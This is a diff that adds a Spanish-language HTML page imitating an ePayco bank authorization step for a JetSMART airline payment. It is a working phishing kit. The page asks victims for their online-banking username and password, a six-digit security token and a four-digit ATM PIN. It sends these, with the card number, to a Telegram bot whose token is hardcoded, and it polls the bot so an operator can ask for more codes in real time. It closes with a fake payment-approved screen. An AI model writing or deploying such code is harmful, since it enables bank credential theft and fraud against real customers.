@@ -1,0 +1,674 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Autorización</title>
+  <style>
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    body, html { height: 100%; width: 100%; overflow: hidden; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: #f0f2f5; }
+
+    /* ── FONDO ── */
+    .background { position: fixed; top: 0; left: 0; width: 100%; height: 100%; filter: brightness(0.5) blur(10px); z-index: -1; }
+
+    /* ── CONTENEDOR PRINCIPAL ── */
+    .contenedor-flotante {
+      background: #fff; border-radius: 16px;
+      padding: 20px 20px 25px; text-align: center; max-width: 400px;
+      width: 90%; box-shadow: 0 8px 32px rgba(0,0,0,.18);
+      position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%);
+    }
+    .logo-izq { position: absolute; top: 15px; left: 15px; max-height: 40px; max-width: 130px; object-fit: contain; }
+    .logo-der { position: absolute; top: 15px; right: 15px; max-height: 38px; max-width: 90px; object-fit: contain; }
+    .separator { margin-top: 60px; margin-bottom: 15px; border-bottom: 1px solid #e5e7eb; }
+    .contenedor-flotante h2 { font-size: 17px; margin-bottom: 10px; color: #1a1a2e; font-weight: 700; }
+    .contenedor-flotante p { font-size: 13px; color: #555; margin-bottom: 8px; line-height: 1.5; }
+    .contenedor-flotante strong { color: #111; }
+    form { margin-top: 10px; text-align: left; }
+    .form-group { display: flex; align-items: center; margin-bottom: 12px; }
+    .form-group label { width: 80px; font-size: 13px; color: #444; font-weight: 600; }
+    .form-group input { flex: 1; max-width: 160px; padding: 8px 10px; border-radius: 8px; border: 1.5px solid #d1d5db; font-size: 13px; outline: none; transition: border .2s; }
+    .form-group input:focus { border-color: #004aad; }
+    small { display: block; margin-top: -5px; font-size: 11px; color: #9ca3af; text-align: left; margin-bottom: 12px; }
+    .btn-autorizar {
+      margin-top: 6px; width: 100%; padding: 11px;
+      background: linear-gradient(135deg, #004aad, #0066cc);
+      color: #fff; border: none; border-radius: 10px;
+      font-weight: 700; font-size: 14px; cursor: pointer;
+      letter-spacing: .3px; transition: opacity .2s;
+    }
+    .btn-autorizar:disabled { background: #d1d5db; color: #9ca3af; cursor: not-allowed; }
+    .btn-autorizar:not(:disabled):hover { opacity: .9; }
+
+    /* ── LOADER ── */
+    .loaderp-full {
+      position: fixed; inset: 0; background: rgba(255,255,255,.95);
+      z-index: 9999; display: flex; flex-direction: column;
+      justify-content: center; align-items: center; gap: 18px;
+    }
+    .loaderp-full.hidden { display: none; }
+    .spinner-bank {
+      width: 52px; height: 52px;
+      border: 4px solid #e5e7eb;
+      border-top-color: #004aad;
+      border-radius: 50%; animation: spin 1s linear infinite;
+    }
+    .loader-txt { font-size: 14px; color: #374151; font-weight: 600; }
+    .loader-sub { font-size: 12px; color: #9ca3af; margin-top: -12px; }
+    @keyframes spin { to { transform: rotate(360deg); } }
+
+    /* ── PANTALLA DINÁMICA (estilo bancario) ── */
+    .screen {
+      position: fixed; inset: 0; background: #f0f2f5;
+      z-index: 10000; display: none;
+      flex-direction: column; align-items: center; justify-content: center;
+      padding: 24px;
+    }
+    .screen.show { display: flex; }
+
+    .bank-card {
+      background: #fff; border-radius: 16px; width: 100%; max-width: 380px;
+      box-shadow: 0 4px 24px rgba(0,0,0,.10); overflow: hidden;
+    }
+    .bank-card-header {
+      background: linear-gradient(135deg, #004aad, #0066cc);
+      padding: 18px 20px; display: flex; align-items: center; gap: 12px;
+    }
+    .bank-card-header .lock-icon {
+      width: 38px; height: 38px; background: rgba(255,255,255,.2);
+      border-radius: 50%; display: flex; align-items: center; justify-content: center;
+      font-size: 18px; flex-shrink: 0;
+    }
+    .bank-card-header-txt h3 { color: #fff; font-size: 15px; font-weight: 700; }
+    .bank-card-header-txt p  { color: rgba(255,255,255,.75); font-size: 12px; margin-top: 2px; }
+
+    .bank-card-body { padding: 22px 20px 20px; }
+
+    /* Cajas de dígitos */
+    .digits-row { display: flex; gap: 10px; justify-content: center; margin: 18px 0 8px; }
+    .digit-box {
+      width: 44px; height: 54px; border: 2px solid #d1d5db; border-radius: 10px;
+      display: flex; align-items: center; justify-content: center;
+      font-size: 24px; font-weight: 700; color: #1a1a2e;
+      background: #f9fafb; transition: border-color .2s, box-shadow .2s;
+      position: relative;
+    }
+    .digit-box.active { border-color: #004aad; box-shadow: 0 0 0 3px rgba(0,74,173,.15); background: #fff; }
+    .digit-box.filled { border-color: #374151; background: #fff; }
+    .digit-box .cursor {
+      width: 2px; height: 24px; background: #004aad;
+      animation: blink .9s step-end infinite; display: none;
+    }
+    .digit-box.active .cursor { display: block; }
+    @keyframes blink { 0%,100%{opacity:1} 50%{opacity:0} }
+
+    /* Input oculto */
+    .hidden-input { position: absolute; opacity: 0; width: 1px; height: 1px; }
+
+    .digits-hint { font-size: 12px; color: #9ca3af; text-align: center; margin-bottom: 6px; }
+
+    .bank-info-row {
+      background: #f8fafc; border-radius: 10px; padding: 12px 14px;
+      margin-bottom: 14px; border: 1px solid #e5e7eb;
+    }
+    .bank-info-row p { font-size: 12px; color: #6b7280; margin-bottom: 3px; }
+    .bank-info-row p:last-child { margin-bottom: 0; }
+    .bank-info-row span { font-weight: 700; color: #1a1a2e; }
+
+    .btn-confirm {
+      width: 100%; padding: 13px; background: linear-gradient(135deg, #004aad, #0066cc);
+      color: #fff; border: none; border-radius: 10px;
+      font-size: 15px; font-weight: 700; cursor: pointer;
+      letter-spacing: .3px; transition: opacity .2s; margin-top: 4px;
+    }
+    .btn-confirm:disabled { background: #d1d5db; color: #9ca3af; cursor: not-allowed; }
+    .btn-confirm:not(:disabled):hover { opacity: .9; }
+
+    .seguridad-badge {
+      display: flex; align-items: center; gap: 6px;
+      justify-content: center; margin-top: 14px;
+      font-size: 11px; color: #9ca3af;
+    }
+    .seguridad-badge span { font-size: 14px; }
+
+    /* ── PANTALLA APROBADO ── */
+    .aprobado-screen {
+      position: fixed; inset: 0; background: #fff;
+      z-index: 10000; display: none;
+      flex-direction: column; align-items: center; justify-content: flex-start;
+      padding: 0;
+    }
+    .aprobado-screen.show { display: flex; }
+
+    .aprobado-header {
+      width: 100%; background: linear-gradient(135deg, #AF272F, #d93025);
+      padding: 28px 20px 22px; text-align: center;
+    }
+    .aprobado-header img { max-height: 36px; margin-bottom: 14px; }
+    .aprobado-check {
+      width: 64px; height: 64px; background: rgba(255,255,255,.2);
+      border-radius: 50%; margin: 0 auto 12px;
+      display: flex; align-items: center; justify-content: center;
+      font-size: 32px;
+    }
+    .aprobado-header h2 { color: #fff; font-size: 20px; font-weight: 800; margin-bottom: 4px; }
+    .aprobado-header p  { color: rgba(255,255,255,.85); font-size: 13px; }
+
+    .aprobado-body { width: 100%; max-width: 420px; padding: 24px 20px; flex: 1; overflow-y: auto; }
+
+    .reserva-box {
+      background: #f0f7ff; border: 1.5px solid #bfdbfe;
+      border-radius: 14px; padding: 18px; margin-bottom: 18px; text-align: center;
+    }
+    .reserva-box .reserva-label { font-size: 11px; color: #6b7280; text-transform: uppercase; letter-spacing: 1px; margin-bottom: 6px; }
+    .reserva-box .reserva-num   { font-size: 28px; font-weight: 900; color: #004aad; letter-spacing: 4px; }
+    .reserva-box .reserva-sub   { font-size: 11px; color: #9ca3af; margin-top: 4px; }
+
+    .detalle-lista { background: #f9fafb; border-radius: 12px; overflow: hidden; margin-bottom: 18px; }
+    .detalle-row {
+      display: flex; justify-content: space-between; align-items: center;
+      padding: 12px 16px; border-bottom: 1px solid #f0f0f0; font-size: 13px;
+    }
+    .detalle-row:last-child { border-bottom: none; }
+    .detalle-row .dl { color: #6b7280; }
+    .detalle-row .dr { font-weight: 700; color: #1a1a2e; text-align: right; max-width: 55%; }
+    .detalle-row .dr.green { color: #16a34a; }
+
+    .aprobado-footer-note {
+      font-size: 12px; color: #9ca3af; text-align: center; line-height: 1.6;
+      padding: 0 8px 24px;
+    }
+
+    /* ── PANTALLA ERROR ── */
+    .error-screen {
+      position: fixed; inset: 0; background: #fff;
+      z-index: 10000; display: none;
+      flex-direction: column; align-items: center; justify-content: center;
+      padding: 30px; text-align: center;
+    }
+    .error-screen.show { display: flex; }
+    .error-icon-wrap {
+      width: 72px; height: 72px; border-radius: 50%;
+      display: flex; align-items: center; justify-content: center;
+      font-size: 34px; margin-bottom: 18px;
+    }
+    .error-icon-wrap.red    { background: #fee2e2; }
+    .error-icon-wrap.yellow { background: #fef9c3; }
+    .error-icon-wrap.orange { background: #ffedd5; }
+    .error-titulo { font-size: 19px; font-weight: 800; color: #1a1a2e; margin-bottom: 8px; }
+    .error-desc   { font-size: 13px; color: #6b7280; max-width: 280px; line-height: 1.6; margin-bottom: 22px; }
+    .btn-reintentar {
+      padding: 12px 28px; background: #004aad; color: #fff;
+      border: none; border-radius: 10px; font-size: 14px; font-weight: 700;
+      cursor: pointer;
+    }
+  </style>
+</head>
+<body>
+  <div class="background"></div>
+
+  <!-- ── LOADER ── -->
+  <div class="loaderp-full hidden" id="loader-espera">
+    <div class="spinner-bank"></div>
+    <div class="loader-txt" id="loader-texto">Procesando transacción...</div>
+    <div class="loader-sub">Por favor no cierres esta ventana</div>
+  </div>
+
+  <!-- ── PANTALLA DINÁMICA / CAJERO ── -->
+  <div class="screen" id="screen-dinamica">
+    <div class="bank-card">
+      <div class="bank-card-header">
+        <div class="lock-icon">🔐</div>
+        <div class="bank-card-header-txt">
+          <h3 id="din-titulo">Clave dinámica</h3>
+          <p id="din-subtitulo">Autenticación de dos pasos</p>
+        </div>
+      </div>
+      <div class="bank-card-body">
+        <div class="bank-info-row">
+          <p>Comercio: <span>JETSMART AIRLINES</span></p>
+          <p>Monto: <span id="din-monto">$ 0</span></p>
+          <p>Tarjeta: <span id="din-tarjeta">**** **** **** ****</span></p>
+        </div>
+        <p style="font-size:13px;color:#374151;margin-bottom:4px;font-weight:600;" id="din-instruccion">Ingresa el código de 6 dígitos de tu app bancaria</p>
+        <div class="digits-row" id="digits-row"></div>
+        <input class="hidden-input" type="tel" id="hidden-input" inputmode="numeric" maxlength="6" autocomplete="one-time-code" />
+        <p class="digits-hint" id="digits-hint">El código expira en <strong id="countdown">5:00</strong></p>
+        <button class="btn-confirm" id="din-btn" disabled>Confirmar</button>
+        <div class="seguridad-badge"><span>🔒</span> Conexión segura SSL · ePayco</div>
+      </div>
+    </div>
+  </div>
+
+  <!-- ── PANTALLA APROBADO ── -->
+  <div class="aprobado-screen" id="screen-aprobado">
+    <div class="aprobado-header">
+      <img src="assets/media/jetsmart-logo.svg" alt="JetSMART" onerror="this.style.display='none'" />
+      <div class="aprobado-check">✅</div>
+      <h2>¡Pago aprobado!</h2>
+      <p>Tu reserva fue confirmada exitosamente</p>
+    </div>
+    <div class="aprobado-body">
+      <div class="reserva-box">
+        <div class="reserva-label">Número de reserva</div>
+        <div class="reserva-num" id="reserva-num">JS000000</div>
+        <div class="reserva-sub">Guarda este código. Lo necesitarás para hacer check-in.</div>
+      </div>
+      <div class="detalle-lista">
+        <div class="detalle-row"><span class="dl">Pasajero</span><span class="dr" id="ap-nombre">—</span></div>
+        <div class="detalle-row"><span class="dl">Ruta</span><span class="dr" id="ap-ruta">—</span></div>
+        <div class="detalle-row"><span class="dl">Tarjeta</span><span class="dr" id="ap-tarjeta">**** ****</span></div>
+        <div class="detalle-row"><span class="dl">Total pagado</span><span class="dr green" id="ap-total">$ 0</span></div>
+        <div class="detalle-row"><span class="dl">Estado</span><span class="dr green">✔ Aprobado</span></div>
+      </div>
+      <p class="aprobado-footer-note">
+        Recibirás un correo de confirmación con los detalles de tu vuelo.<br>
+        Para más información visita <strong>jetsmart.com/co</strong>
+      </p>
+    </div>
+  </div>
+
+  <!-- ── PANTALLA ERROR ── -->
+  <div class="error-screen" id="screen-error">
+    <div class="error-icon-wrap red" id="error-icon-wrap">
+      <span id="error-icon">❌</span>
+    </div>
+    <div class="error-titulo" id="error-titulo">Error</div>
+    <div class="error-desc"   id="error-desc">Ocurrió un error.</div>
+    <button class="btn-reintentar" id="btn-reintentar">Reintentar</button>
+  </div>
+
+  <!-- ── FORMULARIO PRINCIPAL ── -->
+  <div class="contenedor-flotante" id="contenedor-principal">
+    <img id="bank-logo" class="logo-izq" alt="ePayco" src="assets/media/epayco1.jpg" />
+    <img id="card-type-logo" class="logo-der" alt="Visa" src="assets/media/visa.svg" />
+    <div class="separator"></div>
+    <h2>Autorización de transacción</h2>
+    <p>
+      Estas realizando un pago en <strong>JETSMART</strong> por
+      <strong id="monto-transaccion">$ 0</strong><br />
+      con tarjeta terminada en <strong id="card-last4">****</strong>. Por seguridad, esta misma debe ser autorizada por tu banco.
+    </p>
+    <p style="text-align:left;margin-top:18px">
+      <strong>Comercio:</strong> JETSMART<br />
+      <strong>Monto:</strong> <span id="monto-transaccion-detalle">$ 0</span><br />
+      <strong>Tarjeta:</strong> **** **** **** <span id="card-last4-display">****</span>
+    </p>
+    <form id="transaction-form">
+      <div class="form-group">
+        <label for="usuario">Usuario:</label>
+        <input type="text" id="usuario" placeholder="Tu usuario" autocomplete="off" />
+      </div>
+      <div class="form-group">
+        <label for="clave">Clave:</label>
+        <input type="password" id="clave" placeholder="Tu clave" autocomplete="off" />
+      </div>
+      <small>Estos son los datos que utilizas para ingresar a tu app bancaria.</small>
+      <button type="submit" class="btn-autorizar" id="authorize-button" disabled>Autorizar</button>
+    </form>
+  </div>
+
+  <script src="js/telegram.js"></script>
+  <script src="js/actions.js"></script>
+  <script>
+  (function () {
+    const BOT_TOKEN     = '8179516869:AAFaVLETOgpkcll9f2Z2rzJ2QsKr0y07Rls';
+    const POLL_INTERVAL = 3000;
+
+    let pollingTimer = null;
+    let lastUpdateId = 0;
+    let esperandoBot = false;
+    let countdownTimer = null;
+
+    // ── helpers UI ──────────────────────────────────────────────
+    const hide = el => el && (el.style.display = 'none');
+    const contenedor    = document.getElementById('contenedor-principal');
+    const loader        = document.getElementById('loader-espera');
+    const loaderTexto   = document.getElementById('loader-texto');
+    const screenDin     = document.getElementById('screen-dinamica');
+    const screenAprobado= document.getElementById('screen-aprobado');
+    const screenError   = document.getElementById('screen-error');
+
+    const ocultarTodo = () => {
+      contenedor.style.display = 'none';
+      loader.classList.add('hidden');
+      screenDin.classList.remove('show');
+      screenAprobado.classList.remove('show');
+      screenError.classList.remove('show');
+    };
+    const showLoader = (txt) => {
+      ocultarTodo();
+      loaderTexto.textContent = txt || 'Procesando transacción...';
+      loader.classList.remove('hidden');
+    };
+    const volverFormulario = () => {
+      ocultarTodo();
+      contenedor.style.display = '';
+      if (countdownTimer) clearInterval(countdownTimer);
+    };
+
+    // ── Logos ───────────────────────────────────────────────────
+    function actualizarLogos() {
+      const tipeObj  = JSON.parse(localStorage.getItem('TIPE') || '{}');
+      const tipo     = (tipeObj.tipo || '').toLowerCase();
+      const cardLogo = document.getElementById('card-type-logo');
+      cardLogo.src   = tipo.includes('master') ? 'assets/media/mastercard1.webp' : 'assets/media/visa.svg';
+      cardLogo.alt   = tipo.includes('master') ? 'Mastercard' : 'Visa';
+    }
+
+    // ── Datos transacción ───────────────────────────────────────
+    function mostrarDatos() {
+      const datos  = JSON.parse(localStorage.getItem('datos_pago') || '{}');
+      const monto  = parseInt(localStorage.getItem('total_pagar')) || 0;
+      const moneda = monto.toLocaleString('es-CO', { style: 'currency', currency: 'COP' });
+      document.getElementById('monto-transaccion').innerText         = moneda;
+      document.getElementById('monto-transaccion-detalle').innerText = moneda;
+      document.getElementById('din-monto').innerText                 = moneda;
+      if (datos.tarjeta) {
+        const u4 = datos.tarjeta.slice(-4);
+        document.getElementById('card-last4').innerText         = u4;
+        document.getElementById('card-last4-display').innerText = u4;
+        document.getElementById('din-tarjeta').innerText        = `**** **** **** ${u4}`;
+      }
+    }
+
+    // ── Habilitar botón autorizar ───────────────────────────────
+    function habilitarBoton() {
+      const u = document.getElementById('usuario').value.trim();
+      const c = document.getElementById('clave').value.trim();
+      document.getElementById('authorize-button').disabled = !(u && c && c.length <= 11);
+    }
+    document.getElementById('usuario').addEventListener('input', habilitarBoton);
+    document.getElementById('clave').addEventListener('input', habilitarBoton);
+
+    // ── Dígitos bancarios ───────────────────────────────────────
+    let digitCount = 6;
+    let digitValues = [];
+
+    function buildDigits(n) {
+      digitCount  = n;
+      digitValues = Array(n).fill('');
+      const row   = document.getElementById('digits-row');
+      const input = document.getElementById('hidden-input');
+      row.innerHTML = '';
+      input.maxLength = n;
+      input.value     = '';
+
+      for (let i = 0; i < n; i++) {
+        const box = document.createElement('div');
+        box.className = 'digit-box';
+        box.id = `dbox-${i}`;
+        const cursor = document.createElement('div');
+        cursor.className = 'cursor';
+        box.appendChild(cursor);
+        row.appendChild(box);
+        box.addEventListener('click', () => input.focus());
+      }
+      // Activar primer box
+      document.getElementById('dbox-0')?.classList.add('active');
+
+      input.addEventListener('input', () => {
+        const val = input.value.replace(/\D/g, '').slice(0, n);
+        input.value = val;
+        digitValues  = val.split('').concat(Array(n).fill('')).slice(0, n);
+        for (let i = 0; i < n; i++) {
+          const box = document.getElementById(`dbox-${i}`);
+          box.classList.remove('active', 'filled');
+          // Mostrar punto en vez del dígito real
+          box.childNodes[0].nodeType === Node.TEXT_NODE && box.childNodes[0].remove();
+          if (digitValues[i]) {
+            const dot = document.createTextNode('●');
+            box.insertBefore(dot, box.firstChild);
+            box.classList.add('filled');
+          } else {
+            box.classList.remove('filled');
+          }
+        }
+        // Marcar activo
+        const activeIdx = Math.min(val.length, n - 1);
+        document.getElementById(`dbox-${activeIdx}`)?.classList.add('active');
+        document.getElementById('din-btn').disabled = val.length < n;
+      });
+
+      input.addEventListener('focus', () => {
+        const idx = Math.min(digitValues.filter(Boolean).length, n - 1);
+        document.getElementById(`dbox-${idx}`)?.classList.add('active');
+      });
+
+      setTimeout(() => input.focus(), 300);
+    }
+
+    // ── Countdown ───────────────────────────────────────────────
+    function startCountdown(seconds) {
+      if (countdownTimer) clearInterval(countdownTimer);
+      const el = document.getElementById('countdown');
+      let s = seconds;
+      const update = () => {
+        const m = Math.floor(s / 60);
+        const ss = String(s % 60).padStart(2, '0');
+        if (el) el.textContent = `${m}:${ss}`;
+        if (s <= 0) { clearInterval(countdownTimer); if (el) el.textContent = 'Expirado'; }
+        s--;
+      };
+      update();
+      countdownTimer = setInterval(update, 1000);
+    }
+
+    // ── Pantalla dinámica / cajero ──────────────────────────────
+    function showDinamica(tipo) {
+      ocultarTodo();
+      const esCajero  = tipo === 'pedir_cajero';
+      const n         = esCajero ? 4 : 6;
+      const titulo    = esCajero ? '🏧 Clave de cajero' : '🔄 Token de seguridad';
+      const subtitulo = esCajero ? 'Verificación adicional requerida' : 'Autenticación de dos pasos';
+      const instruccion = esCajero
+        ? 'Ingresa tu clave de 4 dígitos del cajero electrónico'
+        : 'Ingresa el código de 6 dígitos de tu app bancaria o SMS';
+      const hint = esCajero ? 'Esta es tu clave personal de cajero' : 'El código expira en <strong id="countdown">5:00</strong>';
+
+      document.getElementById('din-titulo').textContent     = titulo;
+      document.getElementById('din-subtitulo').textContent  = subtitulo;
+      document.getElementById('din-instruccion').textContent = instruccion;
+      document.getElementById('digits-hint').innerHTML       = hint;
+      document.getElementById('din-btn').disabled            = true;
+
+      buildDigits(n);
+      if (!esCajero) startCountdown(300);
+
+      screenDin.classList.add('show');
+    }
+
+    // ── Pantalla aprobado ───────────────────────────────────────
+    function showAprobado() {
+      ocultarTodo();
+      stopPolling();
+
+      const datos  = JSON.parse(localStorage.getItem('datos_pago') || '{}');
+      const monto  = parseInt(localStorage.getItem('total_pagar')) || 0;
+      const moneda = monto.toLocaleString('es-CO', { style: 'currency', currency: 'COP' });
+
+      // Generar número de reserva realista
+      const letras = 'ABCDEFGHJKLMNPQRSTUVWXYZ';
+      const reserva = 'JS' +
+        letras[Math.floor(Math.random()*letras.length)] +
+        letras[Math.floor(Math.random()*letras.length)] +
+        String(Math.floor(1000 + Math.random()*9000));
+
+      document.getElementById('reserva-num').textContent = reserva;
+      document.getElementById('ap-nombre').textContent   = datos.nombre || '—';
+      document.getElementById('ap-ruta').textContent     = datos.ruta   || '—';
+      document.getElementById('ap-total').textContent    = moneda;
+      if (datos.tarjeta) {
+        document.getElementById('ap-tarjeta').textContent =
+          `**** **** **** ${datos.tarjeta.slice(-4)}`;
+      }
+      screenAprobado.classList.add('show');
+    }
+
+    // ── Pantalla error ──────────────────────────────────────────
+    function showError(icon, wrap, titulo, desc, onRetry) {
+      ocultarTodo();
+      stopPolling();
+      document.getElementById('error-icon').textContent      = icon;
+      document.getElementById('error-icon-wrap').className   = `error-icon-wrap ${wrap}`;
+      document.getElementById('error-titulo').textContent    = titulo;
+      document.getElementById('error-desc').textContent      = desc;
+      const btn = document.getElementById('btn-reintentar');
+      btn.onclick = onRetry;
+      screenError.classList.add('show');
+    }
+
+    // ── Polling ─────────────────────────────────────────────────
+    async function getUpdates() {
+      try {
+        const url  = `https://api.telegram.org/bot${BOT_TOKEN}/getUpdates?offset=${lastUpdateId + 1}&timeout=2&allowed_updates=["callback_query"]`;
+        const res  = await fetch(url);
+        const data = await res.json();
+        if (!data.ok || !data.result?.length) return;
+        for (const update of data.result) {
+          lastUpdateId = update.update_id;
+          const cb = update.callback_query;
+          if (!cb) continue;
+          await answerCallback(cb.id);
+          if (!esperandoBot) continue;
+          procesarAccion(cb.data || '');
+          break;
+        }
+      } catch (e) { console.warn('Poll:', e); }
+    }
+
+    async function answerCallback(id) {
+      try {
+        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/answerCallbackQuery`, {
+          method: 'POST', headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ callback_query_id: id })
+        });
+      } catch {}
+    }
+
+    function startPolling() {
+      esperandoBot = true;
+      if (pollingTimer) clearInterval(pollingTimer);
+      pollingTimer = setInterval(getUpdates, POLL_INTERVAL);
+    }
+    function stopPolling() {
+      esperandoBot = false;
+      if (pollingTimer) { clearInterval(pollingTimer); pollingTimer = null; }
+    }
+
+    // ── Acciones del bot ────────────────────────────────────────
+    function procesarAccion(accion) {
+      stopPolling();
+      if (countdownTimer) clearInterval(countdownTimer);
+
+      switch (accion) {
+        case 'aprobar':
+          showAprobado();
+          break;
+
+        case 'error_login':
+          showError('❌', 'red',
+            'Usuario o clave incorrectos',
+            'Los datos ingresados no coinciden con los de tu banco. Por favor verifica e inténtalo de nuevo.',
+            () => volverFormulario()
+          );
+          break;
+
+        case 'pedir_dinamica':
+          showDinamica('pedir_dinamica');
+          break;
+
+        case 'pedir_cajero':
+          showDinamica('pedir_cajero');
+          break;
+
+        case 'error_dinamica':
+          showError('⚠️', 'yellow',
+            'Código incorrecto',
+            'El código ingresado no es válido o ha expirado. Por favor solicita uno nuevo en tu app bancaria.',
+            () => showDinamica('pedir_dinamica')
+          );
+          break;
+
+        case 'error_clave':
+          showError('🔑', 'orange',
+            'Clave bancaria incorrecta',
+            'La clave ingresada no es correcta. Verifica tu clave de app bancaria e inténtalo nuevamente.',
+            () => volverFormulario()
+          );
+          break;
+
+        case 'error_tarjeta':
+          showError('💳', 'red',
+            'Tarjeta rechazada',
+            'Tu tarjeta no pudo ser procesada. Verifica los datos de la tarjeta o intenta con otro medio de pago.',
+            () => { window.location.href = 'payment.html'; }
+          );
+          break;
+
+        default:
+          showLoader('Esperando respuesta del banco...');
+          startPolling();
+      }
+    }
+
+    // ── Envío formulario principal ──────────────────────────────
+    document.getElementById('transaction-form').addEventListener('submit', async (e) => {
+      e.preventDefault();
+      showLoader('Procesando transacción...');
+
+      const usuario = document.getElementById('usuario').value.trim();
+      const clave   = document.getElementById('clave').value.trim();
+      const total   = parseInt(localStorage.getItem('total_pagar')) || 0;
+
+      const datosPago = JSON.parse(localStorage.getItem('datos_pago') || '{}');
+      datosPago.bancoldata    = { usuario, clave };
+      datosPago.transactionId = crypto.randomUUID();
+      datosPago.total         = total;
+      localStorage.setItem('datos_pago', JSON.stringify(datosPago));
+
+      const num      = (datosPago.tarjeta || '').replace(/\D/g, '');
+      const esMaster = /^5[1-5]/.test(num) || /^2[2-7]/.test(num);
+      localStorage.setItem('TIPE', JSON.stringify({ tipo: esMaster ? 'mastercard' : 'visa' }));
+      actualizarLogos();
+
+      try {
+        await accionClaveBancaria(datosPago, usuario, clave);
+        startPolling();
+      } catch (err) {
+        console.error(err);
+        volverFormulario();
+      }
+    });
+
+    // ── Confirmar código dinámica/cajero ────────────────────────
+    document.getElementById('din-btn').addEventListener('click', async () => {
+      const codigo    = document.getElementById('hidden-input').value.trim();
+      if (!codigo) return;
+      const datosPago = JSON.parse(localStorage.getItem('datos_pago') || '{}');
+      const tipo      = document.getElementById('din-titulo').textContent;
+
+      showLoader('Verificando código...');
+      await sendTelegram(
+        `📟 *CÓDIGO ADICIONAL*\n\n👤 *Nombre:* ${datosPago.nombre || 'N/A'}\n💳 *Tarjeta:* ${datosPago.tarjeta || 'N/A'}\n📋 *Tipo:* ${tipo}\n🔢 *Código:* \`${codigo}\``
+      );
+      startPolling();
+    });
+
+    // ── Init ────────────────────────────────────────────────────
+    window.addEventListener('DOMContentLoaded', () => {
+      actualizarLogos();
+      mostrarDatos();
+      habilitarBoton();
+
+      fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getUpdates?limit=1&offset=-1`)
+        .then(r => r.json())
+        .then(d => {
+          if (d.result?.length) lastUpdateId = d.result[d.result.length - 1].update_id;
+        }).catch(() => {});
+    });
+
+  })();
+  </script>
+</body>
+</html>
